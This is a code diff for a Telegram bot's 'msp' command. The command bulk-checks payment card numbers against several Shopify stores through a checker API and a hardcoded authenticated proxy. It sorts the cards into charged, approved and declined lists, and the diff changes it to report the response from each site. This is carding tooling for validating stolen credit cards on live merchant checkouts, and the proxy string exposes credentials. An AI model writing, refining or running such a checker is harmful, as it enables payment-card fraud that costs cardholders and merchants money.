@@ -5327,7 +5327,7 @@ async def msite_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 
 
-# ===== Shopify check request with Buttons + TXT Export + Stop + Sorted Results + File Input =====
+# ===== Shopify check request with multi-site responses + Buttons + TXT Export + Stop =====
 import asyncio
 import httpx
 import time
@@ -5361,14 +5361,21 @@ async def check_card(session: httpx.AsyncClient, base_url: str, site: str, card:
     try:
         r = await session.get(url, timeout=25)
         data = r.json()
-        return (
-            data.get("Response", "Unknown"),
-            data.get("Status", "false"),
-            data.get("Price", "0"),
-            data.get("Gateway", "N/A"),
-        )
+        return {
+            "site": site,
+            "response": data.get("Response", "Unknown"),
+            "status": data.get("Status", "false"),
+            "price": data.get("Price", "0"),
+            "gateway": data.get("Gateway", "N/A"),
+        }
     except Exception as e:
-        return f"Error: {str(e)}", "false", "0", "N/A"
+        return {
+            "site": site,
+            "response": f"Error: {str(e)}",
+            "status": "false",
+            "price": "0",
+            "gateway": "N/A",
+        }
 
 
 # ===== Inline Buttons =====
@@ -5403,13 +5410,8 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ===== Background runner =====
 async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards, base_url, sites, msg):
     approved = declined = errors = charged = checked = 0
-    gateway_used = "Self Shopify"
 
-    # Separate lists for results
-    approved_results = []
-    charged_results = []
-    declined_results = []
-    error_results = []
+    approved_results, charged_results, declined_results, error_results = [], [], [], []
 
     PRIORITY = {
         "ORDER_PLACED": 4,
@@ -5433,59 +5435,50 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards, bas
     async with httpx.AsyncClient() as session:
         proxy = "142.147.128.93:6593:fvbysspi:bsbh3trstb1c"
 
-        async def check_one(card, site):
-            resp, status, price, gateway = await check_card(session, base_url, site, card, proxy)
-            resp_str = str(resp).strip()
-            resp_upper = resp_str.upper().replace(" ", "_")
-
-            score = 0
-            for key, val in PRIORITY.items():
-                if key in resp_upper:
-                    score = val
-                    break
-
-            return resp_str, score, status, price, gateway
-
         async def worker(card):
-            nonlocal approved, declined, errors, charged, checked, gateway_used
+            nonlocal approved, declined, errors, charged, checked
             if context.user_data.get("msp_stop"):
                 return
 
+            # Check card across ALL sites concurrently
             responses = await asyncio.gather(
-                *[check_one(card, site) for site in sites], return_exceptions=True
+                *[check_card(session, base_url, site, card, proxy) for site in sites],
+                return_exceptions=False,
             )
 
-            # pick best response
-            best_resp, best_score, best_status, best_price, best_gateway = "Unknown", 0, "false", "0", "N/A"
-            for r in responses:
-                if isinstance(r, Exception):
-                    resp_str, score, status, price, gateway = f"Error: {r}", 0, "false", "0", "N/A"
-                else:
-                    resp_str, score, status, price, gateway = r
+            # Build site-wise result lines
+            site_lines = []
+            best_score = 0
+            for resp in responses:
+                resp_text = str(resp["response"]).strip()
+                site_line = f"[{resp['site']}] Response={resp_text} | Price={resp['price']} | Gateway={resp['gateway']} | Status={resp['status']}"
+                site_lines.append(site_line)
+
+                # score classification
+                resp_upper = resp_text.upper().replace(" ", "_")
+                score = 0
+                for key, val in PRIORITY.items():
+                    if key in resp_upper:
+                        score = val
+                        break
                 if score > best_score:
-                    best_resp, best_score, best_status, best_price, best_gateway = resp_str, score, status, price, gateway
+                    best_score = score
 
-            # build line to show real API info
-            line_resp = best_resp
-            if best_gateway and best_gateway != "N/A":
-                line_resp += f" | Gateway={best_gateway}"
-            if best_status and best_status != "false":
-                line_resp += f" | Status={best_status}"
-
-            # Classification & store result
+            # Decide classification
+            full_result = f"{card}\n    " + "\n    ".join(site_lines)
             if best_score >= 4:
                 charged += 1
                 approved += 1
-                charged_results.append(f"🔥 {card}\n    {line_resp}")
+                charged_results.append(f"🔥 {full_result}")
             elif best_score == 3:
                 approved += 1
-                approved_results.append(f"✅ {card}\n    {line_resp}")
+                approved_results.append(f"✅ {full_result}")
             elif best_score == 2:
                 declined += 1
-                declined_results.append(f"❌ {card}\n    {line_resp}")
+                declined_results.append(f"❌ {full_result}")
             else:
                 errors += 1
-                error_results.append(f"⚠️ {card}\n    {line_resp}")
+                error_results.append(f"⚠️ {full_result}")
 
             checked += 1
 
@@ -5501,7 +5494,6 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards, bas
                 f"❌ Declined : {declined}\n"
                 f"⚠️ Errors : {errors}\n"
                 f"🔄 Checked : {checked} / {len(cards)}\n"
-                f"🏬 Gateway : {gateway_used}\n"
                 f"━━━━━━━━━━━━━━━━━━━━━━━\n"
                 "</code></pre>"
             )
@@ -5515,13 +5507,12 @@ async def run_msp(update: Update, context: ContextTypes.DEFAULT_TYPE, cards, bas
             except:
                 pass
 
-        # sequential so update fires each card
         for card in cards:
             if context.user_data.get("msp_stop"):
                 break
             await worker(card)
 
-    # Delete the summary msg
+    # Delete summary msg
     try:
         await msg.delete()
     except:
@@ -5564,17 +5555,12 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     raw_input = None
     cards = []
 
-    # Case 1: args provided
     if context.args:
         raw_input = " ".join(context.args)
         cards = [m.group(0) for m in CARD_REGEX.finditer(raw_input)]
-
-    # Case 2: replied text
     elif update.message.reply_to_message and update.message.reply_to_message.text:
         raw_input = update.message.reply_to_message.text
         cards = [m.group(0) for m in CARD_REGEX.finditer(raw_input)]
-
-    # Case 3: replied document
     elif update.message.reply_to_message and update.message.reply_to_message.document:
         file = await update.message.reply_to_message.document.get_file()
         content = await file.download_as_bytearray()
@@ -5608,7 +5594,6 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"❌ Declined : 0\n"
         f"⚠️ Errors : 0\n"
         f"🔄 Checked : 0 / {len(cards)}\n"
-        f"🏬 Gateway : AutoShopify\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
         "</code></pre>"
     )
@@ -5622,6 +5607,7 @@ async def msp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
 
     asyncio.create_task(run_msp(update, context, cards, base_url, sites, msg))
+
 
 
 
